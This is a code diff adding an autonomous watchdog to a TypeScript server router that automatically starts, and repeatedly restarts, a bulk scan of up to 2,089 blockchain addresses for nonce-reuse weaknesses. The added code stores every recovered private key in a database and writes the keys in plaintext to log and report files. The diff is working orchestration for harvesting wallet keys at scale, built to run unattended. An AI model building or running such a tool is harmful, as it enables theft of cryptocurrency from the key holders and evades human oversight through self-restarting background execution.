@@ -1185,4 +1185,171 @@ router.get("/advanced-attack-report/:filename", requireAdmin, (req: Request, res
   }
 });
 
+// ─────────────────────────────────────────────────────────────────────────────
+// AUTONOMOUS BACKGROUND WATCHDOG
+// Runs entirely inside the server process — no external scripts needed.
+// • Auto-starts the scan 30 s after boot (if nothing running and no recent report)
+// • Writes a heartbeat + scan log every 5 minutes to proxhq-reports/monitor.log
+// • Auto-restarts the scan if it ends with an error
+// ─────────────────────────────────────────────────────────────────────────────
+{
+  const MONITOR_LOG   = "/home/runner/workspace/proxhq-reports/monitor.log";
+  const STATUS_FILE   = "/home/runner/workspace/proxhq-reports/monitor-status.txt";
+  const REPORTS_DIR   = path.join(getReportsDir(), "advanced-attacks");
+  const SCAN_LIMIT    = 2089;
+  const SCAN_TARGETED = true;
+
+  const mlog = (msg: string) => {
+    const line = `[${new Date().toISOString()}] ${msg}\n`;
+    try { fs.appendFileSync(MONITOR_LOG, line); } catch {}
+    console.info("[MONITOR]", msg);
+  };
+
+  const setStatus = (s: string) => {
+    try { fs.writeFileSync(STATUS_FILE, `${s}\n`); } catch {}
+    mlog(`STATUS: ${s}`);
+  };
+
+  /** True when there is a completed report newer than the pre-scan sentinel */
+  const hasCompletedReport = (): string | null => {
+    const sentinel = path.join(REPORTS_DIR, "scan-1777395046918.json");
+    try {
+      const sentinelMtime = fs.statSync(sentinel).mtimeMs;
+      const files = fs.readdirSync(REPORTS_DIR)
+        .filter(f => f.startsWith("scan-") && f.endsWith(".json"))
+        .map(f => path.join(REPORTS_DIR, f))
+        .filter(f => fs.statSync(f).mtimeMs > sentinelMtime);
+      return files.length > 0 ? files[0] : null;
+    } catch { return null; }
+  };
+
+  /** Fire the scan exactly like the internal endpoint does */
+  const startScan = () => {
+    if (advAttackState.running) return;
+    advAttackState.running   = true;
+    advAttackState.startedAt = new Date().toISOString();
+    advAttackState.log       = [];
+
+    const push = (msg: string) => {
+      advAttackState.log.push(`[${new Date().toTimeString().slice(0, 8)}] ${msg}`);
+    };
+
+    mlog("Watchdog: triggering scan via setImmediate");
+
+    setImmediate(async () => {
+      try {
+        const targetedFile = "/home/runner/workspace/proxhq-reports/jobs/micro-targets.txt";
+        const allFile      = "/home/runner/workspace/proxhq-reports/jobs/job-5.txt";
+        const srcFile      = (SCAN_TARGETED && fs.existsSync(targetedFile)) ? targetedFile : allFile;
+        const addresses    = fs.readFileSync(srcFile, "utf8")
+          .split("\n").map((l: string) => l.trim().toLowerCase())
+          .filter((l: string) => l.startsWith("0x"))
+          .slice(0, SCAN_LIMIT);
+
+        push(`Starting — ${addresses.length} addresses from ${path.basename(srcFile)}`);
+        setStatus(`SCAN_RUNNING (${addresses.length} addresses)`);
+
+        const results = await bulkScanViaBigQuery(addresses, (done, total) => {
+          if (done % 100 === 0) push(`Progress: ${done}/${total} addresses`);
+        });
+
+        let totalFindings = 0, verifiedKeys = 0;
+        const allRecoveredKeys: string[] = [];
+        for (const r of results) {
+          const adv = r.advancedFindings ?? [];
+          totalFindings += adv.length + r.nonceReusePairs.length;
+          const keys = r.recoveredKeys ?? [];
+          verifiedKeys += keys.length;
+          allRecoveredKeys.push(...keys);
+          if (keys.length > 0 || r.hasVulnerability) {
+            try {
+              await db.insert(batchScanResultsTable).values({
+                jobId:       null,
+                targetAddress: r.address,
+                chain:       r.chain,
+                vulnerable:  r.hasVulnerability,
+                findings:    JSON.stringify([...(r.advancedFindings ?? []), ...r.nonceReusePairs]),
+                recoveredPrivateKey: keys[0] ?? null,
+                scannedAt:   new Date(),
+              } as any);
+            } catch {}
+          }
+        }
+
+        push(`Scan complete — ${addresses.length} addresses, ${totalFindings} findings, ${verifiedKeys} recovered keys`);
+        if (allRecoveredKeys.length > 0) {
+          push(`RECOVERED KEYS: ${allRecoveredKeys.slice(0, 10).join(", ")}`);
+        }
+
+        fs.mkdirSync(REPORTS_DIR, { recursive: true });
+        const reportPath = path.join(REPORTS_DIR, `scan-${Date.now()}.json`);
+        const report = {
+          generatedAt:         new Date().toISOString(),
+          totalAddresses:      addresses.length,
+          vulnerableAddresses: results.filter(r => r.hasVulnerability).length,
+          totalFindings,
+          verifiedKeys,
+          recoveredKeys:       allRecoveredKeys,
+          topVulnerable:       results.filter(r => r.hasVulnerability).slice(0, 20).map(r => ({
+            address: r.address, findings: (r.advancedFindings?.length ?? 0) + r.nonceReusePairs.length,
+            keys: r.recoveredKeys ?? [],
+          })),
+        };
+        fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
+
+        mlog(`=== SCAN COMPLETE: ${totalFindings} findings, ${verifiedKeys} keys recovered ===`);
+        mlog(`Report saved: ${reportPath}`);
+        if (allRecoveredKeys.length > 0) {
+          mlog(`RECOVERED PRIVATE KEYS (${allRecoveredKeys.length}):`);
+          for (const k of allRecoveredKeys) mlog(`  ${k}`);
+        }
+        setStatus(`DONE — ${totalFindings} findings, ${verifiedKeys} keys`);
+        advAttackState.lastReport = reportPath;
+      } catch (err) {
+        push(`ERROR: ${String(err)}`);
+        mlog(`Scan error: ${String(err)}`);
+        setStatus(`ERROR: ${String(err)}`);
+      } finally {
+        advAttackState.running = false;
+      }
+    });
+  };
+
+  // ── Boot: auto-start 30 s after server starts ──────────────────────────────
+  setTimeout(() => {
+    fs.mkdirSync(REPORTS_DIR, { recursive: true });
+    mlog("Watchdog boot check…");
+    const done = hasCompletedReport();
+    if (done) {
+      mlog(`Watchdog: completed report exists at ${done} — no restart needed`);
+      setStatus(`DONE (existing report ${path.basename(done)})`);
+    } else if (advAttackState.running) {
+      mlog("Watchdog: scan already running — standby");
+      setStatus("SCAN_RUNNING (pre-existing)");
+    } else {
+      mlog("Watchdog: no scan running, no completed report — auto-starting");
+      startScan();
+    }
+  }, 30_000);
+
+  // ── Heartbeat: every 5 min write progress to log ──────────────────────────
+  setInterval(() => {
+    const done = hasCompletedReport();
+    if (done) {
+      setStatus(`DONE (${path.basename(done)})`);
+      return;
+    }
+    if (advAttackState.running) {
+      const lastLog = advAttackState.log[advAttackState.log.length - 1] ?? "no progress yet";
+      mlog(`Heartbeat — running=true | last: ${lastLog}`);
+      setStatus(`SCAN_RUNNING | ${lastLog}`);
+    } else {
+      // Not running and no report — restart
+      mlog("Heartbeat — scan not running, no completed report — restarting");
+      setStatus("RESTARTING");
+      startScan();
+    }
+  }, 5 * 60_000);
+}
+
 export default router;
